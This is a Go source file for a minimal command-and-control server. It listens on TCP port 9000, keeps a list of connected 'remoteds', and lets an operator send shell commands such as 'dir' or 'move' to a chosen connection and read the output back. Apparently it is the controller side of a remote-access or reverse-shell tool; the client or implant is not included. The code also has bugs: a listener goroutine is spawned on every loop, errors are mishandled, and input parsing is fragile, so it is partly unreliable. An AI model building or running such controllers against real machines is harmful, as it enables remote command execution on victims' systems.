package main

import (
	"fmt"
	"net"
	"time"
	"bufio"
	"strings"
	"os"
	"strconv"
)

type remoted struct {
	conn net.Conn
} 

func (r remoted)send_cmd(cmd string) (string, bool) {
	_, err := r.conn.Write([]byte(cmd))
	if err != nil {
		fmt.Println("An error has been raised sending cmd to "+r.conn.RemoteAddr().String())
		fmt.Println(err)
		return "",false
	}
	recv := bufio.NewReader(r.conn)
	data, err2 := recv.ReadString('¤')
	if err2 != nil {
		fmt.Println("An error has been reading cmd output from "+r.conn.RemoteAddr().String())
		fmt.Println(err)
		return "", false
	}
	return string(data), true
}

func listen(l *[]remoted, ln net.Listener) {
	for {
		conn, err := ln.Accept()
		if err != nil {
			fmt.Println("An error has been raised with the listener")
			fmt.Println(err)
		}
		remoted := remoted{conn : conn}
		fmt.Println("New remoted connected : "+remoted.conn.RemoteAddr().String())
		*l = append(*l, remoted)
	}
}

func remove(l *[]remoted, r remoted) {
	for i, v := range *l {
		if r == v {
			*l = append((*l)[:i], (*l)[i+1:]...)
			break
		}
	}
	fmt.Println("Removed "+r.conn.RemoteAddr().String())
}

func list(l []remoted) {
	fmt.Println("Here is the list of remoteds. To reach one of 	them :\n <index> <cmd>.\nAs example '1 dir' or '19 move note.txt ..'")
	for v, i := range l {
		fmt.Printf("[%d]"+i.conn.RemoteAddr().String()+"\n",v+1)
	}
}

func getln(port string) net.Listener {
	ln, err := net.Listen("tcp",":"+port)
	if err != nil {
		fmt.Println("An error has been raised trying to start listening")
		fmt.Println(err)
		os.Exit(1)
	}
	return ln
}

func getcmd() string {
	scanner := bufio.NewReader(os.Stdin)
	text, _ := scanner.ReadString('\n')
	return text
}

func pair(s string,l []remoted) remoted {
	i, err := strconv.Atoi(s)
	if err != nil {
		fmt.Println("Erorr : enter a valid number")
		return remoted{}
	}
	return l[i-1]
}

func main() {
	fmt.Println("[*] Server started "+time.Now().Format("02/01 15:04:05"))
	var remoted_list []remoted
	ln := getln("9000")
	for {
		go listen(&remoted_list, ln)
		cmd := getcmd()
		if cmd[:len(cmd)-2] == "list" || strings.ContainsAny(cmd, " ") == false {
			list(remoted_list)
		} else {
			split := strings.SplitN(cmd, " ", 2)
			aim := pair(split[0], remoted_list)
			if aim.conn != nil {
				output, done := aim.send_cmd(split[1])
				if done == true {
					fmt.Println(output)
				}
			} else {
				list(remoted_list)
			}
		}
	}
}